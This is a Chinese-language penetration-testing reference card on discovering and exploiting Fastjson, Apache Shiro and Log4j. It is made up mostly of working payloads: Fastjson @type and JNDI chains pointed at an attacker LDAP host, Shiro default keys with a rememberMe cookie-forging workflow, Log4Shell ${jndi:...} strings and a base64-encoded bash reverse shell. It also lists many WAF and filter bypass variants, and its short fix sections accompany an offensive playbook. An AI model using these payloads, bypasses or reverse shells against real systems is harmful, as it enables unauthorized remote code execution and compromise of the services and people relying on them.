---
name: kb_fastjson_shiro_log4j_master_2026
description: Fastjson/Shiro/Log4j 三件套发现→利用完整链路—指纹确认/版本探测/低破坏检测/DNSLog/JNDI/不出网/2026新洞/WAF绕过/修复
metadata:
  node_type: knowledge
  type: reference
  modified: 2026-08-13
---

# Fastjson / Shiro / Log4j 三件套从发现到利用（2026版）

> 指纹识别见 `fingerprint/kb_java_component_fingerprint_2026.md`；通用 gadget 表见 `kb_java_deserialization_2026.md`
> POC 直打: `srcwiki_poc/中间件漏洞/623.md`(Log4j) / `630.md`(Shiro) / `srcwiki_poc/CVE-2026/4796.md`(Fastjson 2026)
> 测试顺序铁律：**DNSLog 检测 → 报错回显 → 延迟探测 → 确认后才上 RCE**，全程只读/低破坏

---

# 一、Fastjson

## 1. 发现与确认
- 入口：JSON body 接口、`Content-Type: application/json`、POST 参数含 JSON
- 确认（见指纹卡）：
  ```
  {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}  → ClassNotFoundException = 解析 @type
  {"@type":"java.net.Inet4Address","val":"xxxx.dnslog.cn"}           → DNSLog 收到 = 确认
  ```
- 低版本才直接报错回显；高版本回显被吞时靠 **DNSLog** 确认

## 2. 版本探测
| 探测 | 特征 | 含义 |
|------|------|------|
| `{"@type":"java.lang.Class"}` | 报 `ClassNotFoundException` | 解析了（新版本也解析但可能不报错） |
| `{"@type":"com.sun.rowset.JdbcRowSetImpl"}` | 报错 vs 静默 | 报错=低版本直接可利用 |
| 配合 dnslog 的 InetAddress 系列 | 有回连 | 解析执行了 JNDI/DNS lookup |

实战：**不纠结精确版本，直接按「检测 DNSLog 有回连 → 逐条试利用链」**，先试 ≤1.2.47 Cache 绕过，不行再试 expectClass/2026 probe

## 3. 检测 Payload 全清单
```
# DNSLog 三件套（无需 gadget，纯解析触发）
{"@type":"java.net.Inet4Address","val":"X.dnslog.cn"}
{"@type":"java.net.Inet6Address","val":"X.dnslog.cn"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"X.dnslog.cn"}}
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://X.dnslog.cn"}}
{"@type":"java.net.URL","val":"http://X.dnslog.cn"}

# 报错回显
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
{"x":{"@type":"java.lang.AutoCloseable","@type":"java.io.FileOutputStream"}}   # 高版本探测

# 延迟探测（无外带通道时）
{"@type":"com.alibaba.fastjson.JSONObject","a":{"@type":"java.lang.Thread","name":"...sleep..."}}
```

## 4. 利用链（≤1.2.47 通用）
```json
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Evil","autoCommit":true}
```
- JNDI 服务端：`JNDIExploit -i attacker-ip -p 8888` → LDAP 端口 1389
- **高版本 JDK（8u191+）**：默认禁远程 codebase → 用 `JNDIExploit` 的 **本地类（TomcatBypass/BEANFactory）** 或 Elasticsearch Groovy 绕过

## 5. 不出网利用
```
# TemplatesImpl 字节码（需 SupportNonPublicField，部分接口默认不开）
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",...}

# 写文件链：BasicDataSource + tomcat-dbcp 写 shell
# Oracle JDBC 链：本地序列化→写文件
```

## 6. CVE-2026-16723 专项（2026 重点，在野利用已确认）
- **影响**：FastJson 1.2.68 ~ 1.2.83（含最终 1.x），**AutoType 关闭也中**，无需第三方 gadget
- **原理**：`ParserConfig.checkAutoType` 对每个 @type 执行 `getResourceAsStream(typeName.replace(".","/")+".class")` → `jar:http` 远程探测 → JAR 缓存到 `/proc/self/fd/N` → `jar:file:/proc/self/fd/N` 重新打开并初始化带注解类
- **检测 Payload 形态**：
  ```json
  {"@type":"com.example.MaliciousClass","field":"jar:http://attacker.com/malicious.jar!/com/example/MaliciousClass"}
  ```
- **工具**：`dinosn/fastjson-jsontype-rce-lab` 已拉本地 `tools/fastjson_exp/cti2026_scanner/`
  - **主动探测**（无回显/需兜底时）：
    ```bash
    cd <workdir>/tools/fastjson_exp/cti2026_scanner
    python fjscan_probe.py --auto --collaborator <OOB域> --targets targets.txt
    ```
    - `--collaborator`：Burp Collaborator 子域 / dnslog.cn 域 / 自有 IP 均可
    - `--auto`：自动 baseline + 普通 DNS + Unicode 转义 DNS 三种 probe，逐目标输出汇总
    - `--probe-type jsontype` = @JSONType jar: fetch 路径（需 `--canary-ip` 自有 IP 监听）；`dns` = Inet4Address OOB（dotted host，Collaborator 兼容）
    - targets：每行一个完整 URL 或裸域名（`--scheme/--path/--method/--port` 扩展）
  - **被动检测**（已有流量 jsonl）：`python fjdetect.py --ndjson gateway.jsonl`
  - **静态扫描**（jar/class 文件）：`python fjscan_static.py ...`
- **影响部署**：Spring Boot 2.x/3.x/4.x fat-JAR，JDK 8/11/17/21（滥用嵌套 JAR URL）
- **注意**：1.x 无补丁（已归档），修复 = SafeMode / 迁 2.x

## 7. WAF 绕过（AutoType/@type 关键词被拦）
```
# 1. unicode 编码
{"@type":"com.sun.rowset.JdbcRowSetImpl"}
# 2. @type 大小写/变体（parser 兼容）
{"@type":"Com.sun.rowset.JdbcRowSetImpl"}   # 部分版本不区分大小写
# 3. 注释/空白变形
{"@type":" /*x*/ com.sun.rowset.JdbcRowSetImpl"}
# 4. 多层嵌套 @type 混淆
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}
# 5. 换 Content-Type 走不同 WAF 规则（x-www-form-urlencoded 里塞 JSON）
# 6. 属性名替代：parseObject 接口用 __fastjson_hide 等
# 7. `..` 代替 `//`（CVE-2026-16723 专用编码，@type 的每个 . 会被替换成 /）
@type 值写 jar:http:..<IP_INT>:<PORT>.evil!.Exploit → 归一化成 jar:http://IP:PORT/evil!/Exploit.class
# 8. IP 整数编码（避免 URL 特殊字符破坏）
127.0.0.1 = 2130706433  (a.b.c.d = a<<24|b<<16|c<<8|d)
# 9. Unicode 全转义（WAF 不解 \u 时，键和值全转）
{"@type":"com.sun.rowset.JdbcRowSetImpl"}   # @type 键 + 类名值都转 \u
# 10. 多层嵌套 @type + 换 Content-Type 组合（先绕 WAF 再绕 RASP 特征）
{"a":{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}}
```

## 7b. Fastjson2 safeMode 绕过（2.0.43，泛型擦除——2026 新研究）
- **原理**：`parse` 进 `TypeReference<Map<String, XClass>>` 时，Map 的 value reader（ObjectReaderImplMapTyped）**直接走 Type 路径解析** → `checkAutoType` 根本不被调用 → safeMode 拦截逻辑不执行
- **结果**：@type 被成功解析 + XClass 静态初始化块执行，**`-Dfastjson2.parser.safeMode=true` 也拦不住**
- **检测盲区**：String 路径下 safeMode 静默忽略 @type 降级为 JSONObject，不抛异常 → 防守方不能靠报错检测，必须看**实际值类型**
- **实战**：目标用 fastjson2 + safeMode 时，找泛型反序列化点（TypeReference 绑定 DTO）打这条

## 8. 修复
升级 ≥1.2.83 仍中 2026 → **SafeMode**：`-DFastjson.parser.safeMode=true` / noneautotype 构建；清点传递依赖；迁 2.x（allowlist-first 模型不受影响）

---

# 二、Apache Shiro

## 1. 发现与确认
- **确认**：带 `Cookie: rememberMe=任意值` 请求 → 响应 `Set-Cookie: rememberMe=deleteMe`
- **误报排除**：若响应无 deleteMe = 非 Shiro 或 rememberMe 未启用
- 部分站 rememberMe 只在登录后出现 → 先登录再测

## 2. Key 爆破（关键一步，决定是否可打）
```
# 常见默认 key（注意小版本差异，1.4.2+ 部分默认 key 已改）
kPH+bIxk5D2deZiIxcaaaA==        # 1.2.4 经典默认
4AvVhmFLUs0KTA3Kprsdag==        # 另一常见默认
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
wGiHplamyXlVB11UXWol8g==
# 完整字典: 网上 shiro key 清单（上百个），工具自动爆破
```
- **工具**：shiro_attack（GUI，自动爆破 key + gadget + 回显）、ShiroExploit、ShiroScan
- **判断**：爆破时用 URLDNS gadget（无害）→ 收到 DNS 请求 = key 命中

## 3. Gadget 选择
| 链 | 依赖 | 首选度 |
|----|------|:---:|
| **CommonsBeanutils1** | commons-beanutils（Shiro 必带） | ⭐⭐⭐⭐⭐ 首选 |
| CommonsCollections2/4/6 | commons-collections | ⭐⭐⭐⭐ |
| CommonsCollections1/3/5 | 老版本 | ⭐⭐⭐ |
| JRMPClient | JDK 原生 | ⭐⭐⭐ 不出网辅助 |
- **Shiro 环境必有 commons-beanutils** → CB1 成功率最高

## 4. 利用流程
```
1. 生成 payload: java -jar ysoserial.jar CommonsBeanutils1 "command" > poc.ser
2. AES-CBC 加密（key 用爆破出的）:
   AesCipherService aes = new AesCipherService();
   byte[] key = Base64.decode("爆破出的key");
   ciphertext = aes.encrypt(原始payload, key) → Base64
3. 放入 Cookie: rememberMe=<ciphertext>
4. 命令: 优先 DNSLog(ping) 验证 → 再上反弹 shell
5. 回显: shiro_attack 自带回显模块（CommonsBeanutils1+回显链）
```

## 5. 路径/鉴权绕过（Shiro 常配在 Spring 前）
```
/;/../admin        # 分号截断，Shiro 不拦截但容器放行
/foo/%3b/bar      # 编码分号
/./admin /admin/.. //admin
/admin%2f..%2f     # URL 编码斜杠
# 原理: Shiro 与容器对 URI 规范化不一致（GhostCat 同类问题）
```

## 5.5 WAF 绕过与高版本 AES-GCM（2026 更新，必读）
```
# 高版本加密模式：1.4.2+ 从 AES-CBC 切到 AES-GCM！
Shiro ≥1.4.2 用 AES-GCM → 爆破 key 后必须按 GCM 加密（CBC 密文不兼容，报错/不触发）
工具自动区分: ShiroAttack2 --cbc(≤1.2.4) / --gcm(≥1.2.5)；shiro-exploit.py echo 支持 GCM
# cookie 名可能自定义（xxx_rememberMe 而非字面 rememberMe）
先看登录响应 Set-Cookie / JS，确认实际 cookie 名再打
# 高版本默认密钥（1.8.0+ 部分仍有内置默认 key）
key 字典要覆盖高版本默认 key 清单（网上 shiro key 上百个全集）

# WAF 绕过（记住 rememberMe 处理在 Filter 层）
1. 未知 HTTP 请求方法：GET → XXX（WAF 只解析标准方法, 后端 Tomcat Filter 仍处理 cookie，Servlet 层返回 405 不影响 Filter 层触发）
2. base64 == 填充后追加垃圾数据: rememberMe=<密文>==<junk>
3. 换冷门 gadget 规避签名: CommonsBeanutils 1.9.2 / AttrCompare / ObjectToStringComparator
4. 大 cookie 撑爆 WAF 解析 / 长 URL 拆分段
```

## 6. 新版变化与降级利用
- 1.4.2+ 默认 key 可能变化 → key 爆破字典要覆盖新 key
- **Shiro-721**（未知 key）：Padding Oracle 爆破，需大量请求，最后手段

## 7. 修复
升级 ≥1.7.1；使用随机 key（sessionManager cookie 配置）；禁用 rememberMe 或加安全门

---

# 三、Apache Log4j（Log4Shell）

## 1. 发现面（无指纹 → 全入口打）
Log4j 是库，**所有会被记录日志的可控输入都是入口**：
```
GET/POST 参数全测 + 全部 Header（User-Agent/X-Forwarded-For/Referer/X-Real-IP/Cookie/Authorization）
+ 文件名 + JSON/XML body 所有字符串字段 + 登录用户名 + 搜索关键词 + 导出参数 + 报错触发的日志
```
- **高概率宿主**：Solr、Struts2、vCenter、Jenkins、任意 Java 后台（先在登录/搜索/导出页打）

## 2. 检测（无 JNDI 服务端也能判）
```
# 纯 DNS 外带（最干净）
${jndi:ldap://X.dnslog.cn}            → DNS 收到 = 存在
${jndi:dns://X.dnslog.cn}             # 部分环境 dns 协议绕过
${jndi:ldap://${sys:java.version}.X.dnslog.cn}   # 顺带带出版本

# 无 JNDI 环境的信息泄露探测（lookup 若被解析则回显）
${env:PATH}  ${env:HOME}  ${sys:java.home}  ${java:version}
${env:USERNAME}  ${env:COMPUTERNAME}          # Windows 主机名

# 延迟（sleep）探测
${jndi:ldap://X.dnslog.cn} 不通用，sleep 可用 ${jndi:...} 在低版本 LDAP 解析前延迟
```

## 3. 利用（JNDI 注入）
```
# 服务端
JNDIExploit -i attacker-ip -p 8888        # LDAP 1389 / HTTP 8080
# payload 进任意日志入口
${jndi:ldap://attacker:1389/TomcatBypass/Command/base64编码命令}
${jndi:ldap://attacker:1389/BEANFactory/Command/base64命令}
# 反弹 shell（base64 包 bash）
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}
```
- **高版本 JDK**：用 TomcatBypass/BEANFactory 等本地 gadget 链绕过 trustURLCodebase=false

## 4. Bypass 变体（WAF/关键词过滤，核心绕过库）
```
# 大小写
${jNdI:lDaP://X}          # lookup 协议名不区分大小写
# 变体嵌套（WAF 匹配 ${ 或 jndi 时）
${${lower:j}ndi:${lower:l}da${lower:p}://X}
${${::-j}${::-n}${::-d}${::-i}://X}
${${env:FOO:-j}ndi}       # 环境变量插值
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://X}
# unicode
${jndi:ldap://X}
# 分隔符/编码
%24%7Bjndi:ldap://X%7D    # URL 编码整段
${jndi:ldap://X:1389/a}   # 加无害 path
# 多层 lookup 嵌套
${${::-${::-$${::-j}}}}   # 深度嵌套绕过纯文本过滤
```
**绕过优先级**：`${::-j}${::-n}${::-d}${::-i}` 变体 > 大小写 > unicode > env 插值 > URL 编码整段

**等效集**（wafrift 验证，全部坍缩为同一 JNDI fetch，WAF 匹配 `jndi:`/`ldap:` 全部无效）：
```
${jndi:ldap://h/a}
${${lower:j}ndi:${lower:l}${lower:d}${lower:a}${lower:p}://h/a}
${${::-j}${::-n}di:ldap://h/a}
${${env:NOPE:-j}${sys:nope:-n}${date:'d'}i:ldap://h/a}   # env/sys/date 插值拼字母
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://h/a}
```

**协议切换**（绕过出站过滤）：
```
${jndi:dns://<域>}        # UDP/53, 绕过只拦 TCP 的出站（负载均衡/反向代理后有效）
${jndi:rmiiop://<host>/...}   # RMI-IIOP 协议替代
```

**端口绕过**（出站端口白名单）：`${jndi:ldap://attacker:80/...}` / `8080` / `443` / `8443`（最易放行）

**多层编码叠加**（单层被规则拦后组合）：
```
%25%7Bjndi%3Aldap...        # 双 URL 编码(% → %25)
${jndi[:]ldap[:]//${java[:]version}.<域>/a}   # 分隔符+lookup 组合
# unicode + hex + octal + URL 编码任意组合叠加
```

**真实 IP 头注入点**（代理后只记转发 IP 的入口，WAF 可能不过滤这些头）：
```
X-Forwarded-For / X-Forwarded-Host / CF-Connecting-IP / True-Client-IP / X-Real-IP
```

## 5. 无 JNDI 环境
- 用 `${env:...}` `${sys:...}` 信息泄露确认解析存在 → 高价值信息（PATH/HOME/主机名/JDK 版本）
- 仍无法 RCE 时记录为「Log4j lookup 解析确认」信号，交报告（影响: 信息泄露/环境变量）

## 6. 修复
升级 2.17.1+ / 2.12.4+ / 2.3.1+；老版本设 `-Dlog4j2.formatMsgNoLookups=true`；入口过滤 `${`

---

# 四、三件套联合决策树

```
命中 Java 站点
├─ 响应含 rememberMe=deleteMe        → Shiro 分支（爆破 key → CB1 → RCE）
├─ JSON 接口报 com.alibaba.fastjson  → Fastjson 分支（dnslog → ≤1.2.47链 → 2026 probe）
├─ 有日志记录的任意输入（Solr/Struts/vCenter…）
│                                    → Log4j 分支（全入口打 ${jndi:...} → bypass → JNDI）
└─ 都无 → 通用反序列化探测（rO0AB / ac ed 00 05 / URLDNS）→ kb_java_deserialization_2026.md

每个分支：只读检测确认 → 低破坏验证（DNSLog）→ 确认后上 RCE → 全程留证据（请求/响应）→ 写 report

# 防护绕过兜底（确认漏洞但被 WAF/RASP/过滤器拦时）
组件级: Fastjson §7 十种变体 / Shiro §5.5 GCM+未知方法 / Log4j §4 等效集+协议切换
通用级: RASP/JEP290/ObjectInputFilter 绕过 → kb_java_deserialization_2026.md §10b
顺序: 换 Content-Type → 换协议/方法 → 换 gadget → 换 sink（JDBC/文件写）→ 换加载方式（/proc/self/fd）
```
